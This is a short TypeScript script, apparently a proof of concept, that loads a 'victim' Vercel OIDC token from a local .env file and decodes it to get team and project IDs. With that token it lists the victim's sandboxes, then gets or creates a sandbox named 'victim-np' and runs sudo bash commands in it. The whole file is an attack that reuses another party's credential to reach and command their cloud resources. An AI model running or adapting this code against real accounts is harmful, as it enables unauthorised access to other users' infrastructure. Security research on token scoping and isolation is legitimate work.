import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const existing = await Sandbox.list({ token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("existing sandboxes:", JSON.stringify(existing));
  try {
    const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
    const res = await sbx.runCommand("bash", ["-c", "echo alive; hostname; ip -4 addr show eth0 | head -2"], { sudo: true, wait: true, timeout: 60_000 });
    console.log("exit:", res.exitCode);
    console.log(await res.output("both"));
  } catch (e: any) {
    console.log("get/run failed:", e.message);
    console.log("attempting fresh create...");
    const sbx2 = await Sandbox.create({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
    console.log("created:", sbx2.name, sbx2.id);
    const res2 = await sbx2.runCommand("bash", ["-c", "echo alive; hostname; ip -4 addr show eth0 | head -2"], { sudo: true, wait: true, timeout: 60_000 });
    console.log("exit:", res2.exitCode);
    console.log(await res2.output("both"));
  }
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });